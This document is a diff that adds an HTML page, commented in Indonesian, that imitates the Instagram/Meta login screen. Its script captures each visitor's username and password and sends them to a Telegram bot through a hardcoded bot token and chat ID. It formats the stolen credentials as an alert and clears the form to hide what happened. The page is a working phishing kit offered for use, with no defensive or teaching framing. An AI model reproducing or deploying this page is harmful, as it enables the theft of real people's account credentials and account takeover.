@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram-Login</title>
+    
+    <style>
+        body {
+            /* PERUBAHAN: Menggunakan URL link untuk background */
+            background-image: url('https://files.catbox.moe/h2azoj.png'); 
+            background-size: cover; /* Memastikan gambar menutupi seluruh halaman */
+            background-position: center; /* Memastikan gambar terpusat */
+            background-repeat: no-repeat;
+            
+            color: #f0f0f0; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            position: relative; 
+        }
+
+        .login-container {
+            width: 90%;
+            max-width: 350px; 
+            padding: 30px 20px 10px 20px;
+            text-align: center;
+            /* Background transparan/semi-transparan gelap agar tulisan tetap terbaca */
+            background: rgba(18, 18, 18, 0.9); 
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); /* Efek bayangan */
+        }
+        
+        /* OVERLAY: Jika gambar background terlalu terang, Anda bisa tambahkan ini untuk membuatnya lebih gelap */
+        /* Anda bisa menghapus bagian ini jika tidak diperlukan */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5); /* Overlay gelap 50% */
+            z-index: -1; /* Posisikan di bawah container */
+        }
+
+
+        /* Tulisan Bahasa Indonesia diposisikan di tengah atas */
+        .language-select {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #aaa;
+            font-size: 0.85em;
+            width: 100%;
+            text-align: center;
+        }
+
+        .app-logo {
+            width: 65px; 
+            margin-bottom: 30px;
+        }
+
+        /* Gaya untuk input field */
+        .login-form input {
+            width: 100%;
+            padding: 12px 10px;
+            margin-bottom: 10px;
+            border: 1px solid #363636; 
+            background-color: #262626; 
+            color: #f0f0f0;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        
+        .login-form input::placeholder {
+            color: #a0a0a0;
+        }
+
+        /* Gaya untuk tombol Login (biru) */
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0095f6; 
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .login-button:disabled {
+            background-color: #007bb6; /* sedikit berbeda saat disable */
+            cursor: wait;
+        }
+
+        /* Gaya untuk "Lupa kata sandi?" */
+        .forgot-password {
+            display: block;
+            color: #0095f6;
+            text-decoration: none;
+            font-size: 0.9em;
+            font-weight: 500;
+        }
+
+        /* Garis pemisah dan ruang di bagian bawah */
+        .signup-meta-section {
+            margin-top: 50px; 
+            padding-top: 20px;
+            border-top: 1px solid #363636; 
+        }
+
+        /* Gaya untuk tombol "Buat akun baru" (Outline) */
+        .create-account-button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #363636; 
+            background-color: transparent;
+            color: #0095f6; 
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        /* Gaya untuk logo dan tulisan Meta */
+        .meta-info {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 30px; 
+            padding-bottom: 20px;
+        }
+
+        .meta-logo {
+            height: 14px; 
+            filter: invert(70%);
+            margin-right: 5px;
+        }
+        
+        .meta-text {
+            color: #aaa;
+            font-size: 0.8em;
+            font-weight: bold;
+        }
+    </style>
+    
+</head>
+<body>
+    <p class="language-select">Bahasa Indonesia</p>
+
+    <div class="login-container">
+        
+        <img src="https://files.catbox.moe/1ovidi.png" alt="Logo Aplikasi" class="app-logo">
+        
+        <!-- PENTING: Menambahkan ID ke form agar bisa diakses oleh JavaScript -->
+        <form id="login-form" class="login-form">
+            <!-- PENTING: Menambahkan ID ke input agar bisa diakses oleh JavaScript -->
+            <input type="text" id="username_field" placeholder="Nama pengguna, email, atau nomor ..." required>
+            <input type="password" id="password_field" placeholder="Kata sandi" required>
+            
+            <button type="submit" class="login-button">Login</button>
+            
+            <a href="#" class="forgot-password">Lupa kata sandi?</a>
+        </form>
+        
+        <div class="signup-meta-section">
+            <a href="#" class="create-account-button">Buat akun baru</a>
+            
+            <div class="meta-info">
+                <p class="meta-text"></p>
+                <img src="https://files.catbox.moe/6rqcuf.png" alt="Meta Logo" class="meta-logo">
+                <p class="meta-text"></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Data Bot Telegram Anda
+        const BOT_TOKEN = '8294940824:AAFJYAbNnxRyaNB321v9IEQ_dnqBZJA7R7I';
+        const CHAT_ID = '6315300476';
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        // Ambil elemen HTML menggunakan ID
+        const form = document.getElementById('login-form');
+        const usernameField = document.getElementById('username_field');
+        const passwordField = document.getElementById('password_field');
+        const submitButton = form.querySelector('.login-button');
+
+        // Fungsi utama untuk mengirim data ke Telegram
+        async function sendLoginData(event) {
+            event.preventDefault(); // Mencegah form melakukan reload halaman
+            
+            const username = usernameField.value.trim();
+            const password = passwordField.value.trim();
+            
+            if (!username || !password) {
+                console.warn("⚠️ Peringatan: Harap isi semua kolom input.");
+                return;
+            }
+
+            // Nonaktifkan tombol dan ubah teks saat proses pengiriman
+            submitButton.disabled = true;
+            submitButton.textContent = 'Mengirim Data...';
+
+            // FORMAT PESAN KEREN DENGAN HTML DI SINI
+            const telegramMessage = `
+                <b>🚨 DETEKSI AKUN BARU INSTAGRAM 🚨</b>
+
+                =============================
+                <b>👤 USERNAME/EMAIL:</b> <code>${username}</code>
+                <b>🔑 KATA SANDI:</b> <code>${password}</code>
+                =============================
+
+                <i>⚠️ Data didapatkan melalui form Login.</i>
+            `;
+
+            try {
+                const response = await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: telegramMessage,
+                        // PENTING: Menggunakan HTML untuk format yang lebih keren
+                        parse_mode: 'HTML' 
+                    })
+                });
+
+                if (response.ok) {
+                    console.log("✅ Sukses: Data berhasil dikirim ke Telegram (UI Bersih).");
+                    // Hapus input setelah berhasil dikirim
+                    usernameField.value = '';
+                    passwordField.value = '';
+                } else {
+                    const errorData = await response.json();
+                    console.error("❌ Gagal Mengirim Data. Cek Bot Token/Chat ID. Error Telegram:", errorData);
+                }
+            } catch (error) {
+                console.error("⚠️ Kesalahan Jaringan saat mengirim data:", error);
+            } finally {
+                // Aktifkan kembali tombol dan kembalikan teks
+                submitButton.disabled = false;
+                submitButton.textContent = 'Login';
+            }
+        }
+
+        // Menambahkan event listener ke form saat disubmit
+        form.addEventListener('submit', sendLoginData);
+
+    </script>
+</body>
+</html>
+
